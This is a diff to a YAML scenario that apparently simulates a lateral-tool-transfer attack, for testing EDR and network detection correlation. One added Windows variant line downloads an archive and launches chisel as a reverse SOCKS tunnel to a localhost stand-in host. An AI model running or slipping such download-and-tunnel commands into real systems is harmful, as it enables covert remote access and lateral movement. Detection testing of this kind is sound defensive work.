@@ -80,6 +80,16 @@ stitching_key: src_host
 
 external_tools: []
 
+# ── Causality Group Owner anchor ────────────────────────────────────────────
+# The operator works from a compromised foothold shell on the rogue host; that
+# shell is the Causality Group Owner. It spawns the HTTPS downloader (curl) that
+# is the causality parent of the never-before-seen chisel tunneler, and later
+# spawns the psexec fan-out — so the download -> first-seen-tool -> peer-fan-out
+# lineage is one connected spine rooted on the foothold, not the beacon.
+cgo_anchor:
+  image_name: "bash"
+  primary_username: "svc-account"
+
 steps:
   - id: step-01
     name: "T1570 — archive download from attacker S3 over HTTPS spawns a never-before-seen tunneler"
@@ -95,6 +105,11 @@ steps:
       echo 'cortexsim-edr-015-lateral-tool-transfer-step-complete'
     identity: svc-account
     mitre_technique: "T1570"
+    # Root: HTTPS downloader (curl) spawned by the foothold shell writes+executes
+    # the never-before-seen tunneler. Lateral tool transfer is cross-OS.
+    platforms: ["linux", "windows"]
+    platform_variants:
+      windows: "Invoke-WebRequest https://127.0.0.1/goon.zip -OutFile goon.zip; Start-Process .\\chisel.exe -ArgumentList 'client 127.0.0.1:443 R:socks'"
     expected_detections:
       - plane: EDR
         type: ABIOC
@@ -116,6 +131,12 @@ steps:
       echo 'cortexsim-edr-015-tcp443-tunnel-safe-marker'
     identity: svc-account
     mitre_technique: "T1021.004"
+    # The chisel endpoint tool (step-01) opens the long-lived NDR/NGFW TCP/443
+    # session: an endpoint<->firewall stitch on the same host.
+    platforms: ["linux", "windows"]
+    causality:
+      parent_step: step-01
+      pivot: endpoint_network_stitch
     expected_detections:
       - plane: NDR
         type: XQL
@@ -134,6 +155,13 @@ steps:
       echo 'cortexsim-edr-015-psexec-fanout-step-complete'
     identity: svc-account
     mitre_technique: "T1021.002"
+    # psexec is a second tool transferred by the same foothold on the same host,
+    # fanning out to peers — same-entity (src_host) reuse, a sibling of chisel.
+    # PsExec/SMB fan-out is Windows-native.
+    platforms: ["windows"]
+    causality:
+      parent_step: step-01
+      pivot: shared_entity
     expected_detections:
       - plane: EDR
         type: ABIOC
@@ -153,6 +181,12 @@ steps:
       echo 'cortexsim-edr-015-cr-edr-0015-cross-plane-stitch-verified'
     identity: root
     mitre_technique: "T1570"
+    # Terminal: CR-EDR-0015 fuses both ABIOCs + the NDR 443 tunnel session on the
+    # shared host (src_host) into one lateral-movement incident.
+    platforms: ["linux", "windows"]
+    causality:
+      parent_step: step-03
+      pivot: shared_entity
     expected_detections:
       - plane: EDR
         type: Correlation
